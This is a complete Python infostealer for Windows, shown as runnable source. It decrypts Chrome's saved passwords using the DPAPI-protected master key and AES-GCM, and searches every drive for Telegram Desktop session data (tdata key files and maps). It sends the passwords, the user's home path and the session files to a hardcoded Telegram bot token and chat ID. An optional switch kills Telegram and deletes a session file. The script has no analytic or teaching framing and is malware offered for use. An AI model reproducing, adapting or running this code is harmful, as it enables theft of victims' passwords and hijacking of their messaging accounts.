try:
    from telebot import TeleBot
    import shutil
    import json
    from base64 import b64decode
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    import os
    import sqlite3
    import win32api
except Exception as e:
    print("ERROR importing: " + repr(e))
    pass


log_out = 0  # 1 - is on, 0 - is off


user_id = 441449437
token = '1384970894:AAFwU-7r8wwDR_Pg6thRoEaEddeQPUSK6fk'
name_ur_txt = 'pass.txt'


bot = TeleBot(token)
pathusr = os.path.expanduser('~')
paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')


def getmasterkey():
    try:
        with open(path, encoding="utf-8") as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        print("ERROR: couldn't access the masterkey")
        pass


def decryption(buff, key):
    try:
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print("ERROR in decryption: " + repr(e))


def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                            os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, getmasterkey())
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                with open(name_ur_txt, "w", encoding="utf-8") as f:
                    f.write(text)
    except Exception as e:
        print("ERROR in Chrome() func: " + repr(e))
        pass


def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "Telegram Desktop":
                found = os.path.join(root, name)
                print("***Checking folder: " + found)
                if os.path.exists(found + '\\Telegram.exe'):
                    print("***OK Telegram Desktop has been found")
                    return found
                else:
                    print("ERROR: ^ this is not an actual TG folder. Continuing...")
                    pass

def getFileProperties(fname):
    props = {'FileVersion': None}
    try:
        # backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc
        fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
        props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
                fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
                fixedInfo['FileVersionLS'] % 65536)
    except Exception as e:
        print(repr(e))
        pass
    return props

tddir = []
# tdata_path = []
if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
    # tg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
    tddir.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
    # tdata_path.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
    # version = "Version: " + str(getFileProperties(os.path.join(tg, "Telegram.exe"))["FileVersion"])
    #user = pathusr + "\n" + tddir + "\nVersion: " + str(getFileProperties(os.path.join(tddir, "Telegram.exe"))["FileVersion"])
    print("***OK Default TG folder has been found")

for i in paths:
    found = finddir(i)
    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
        tddir.append(found)# = finddir(i)
    # if tddir[1] is not None:
    # print(getFileProperties("Telegram.exe"))
    # version = "Version: " + str(getFileProperties(os.path.join(tddir[1], "Telegram.exe"))["FileVersion"])
    # tdata_path.append(tddir[1] + '\\tdata\\')# = tddir[1] + '\\tdata\\'
    # break
   # else:
   #      user = pathusr + "\n(TG not found)"
   #      print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
   #      pass
tdata_path =[]
for i in tddir:
    #print("test", i)
    tdata_path.append(os.path.join(i, "tdata"))
    #print(tdata_path)
def logout_windows(bool):
    if bool:
        try:
            global pathd877
            os.system('taskkill /f /im Telegram.exe')
            os.remove(pathd877)
        except Exception as e:
            print("ERROR: Failed to logout: " + repr(e))
            pass
    else:
        print("***Logout state is 0")
        pass


def send_txt():
    try:
        bot.send_document(user_id, open(name_ur_txt,'rb'))
        os.remove(name_ur_txt)
        print("***OK Passwords have been sended successfully")
    except Exception as e:
        print("ERROR in send_txt() func: " + repr(e))
        pass


def send_session_files():
    for i in tdata_path:
        user = getFileProperties(os.path.join(i[:-5],"Telegram.exe"))["FileVersion"]
        #print(user)
        for root, dirs, files in os.walk(i):
            for dir in dirs:
                if dir[0:15] == "D877F783D5D3EF8":
                    mapsdir = os.path.join(i, dir)
            for file in files:
                if file[0:15] == "D877F783D5D3EF8":
                    print("***OK Matched D877F783D5D3EF8 in " + i)
                    pathd877 = os.path.join(i, file)
                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)
                elif file == "maps":
                    print("***OK Matched maps in " + i)
                    bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=i + "\nVersion: " + user)
                elif file == "key_datas":
                    print("***OK Matched key_datas in " + i)
                    pathd877 = os.path.join(i, file)
                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)



def main():
    try:
        Chrome()
        bot.send_message(user_id, pathusr)
        send_txt()
        send_session_files()
        logout_windows(log_out)
    except Exception as e:
        print('ERROR: Main function: ' + repr(e))
        pass


if __name__ == '__main__':
    main()
    print("***Finished***")

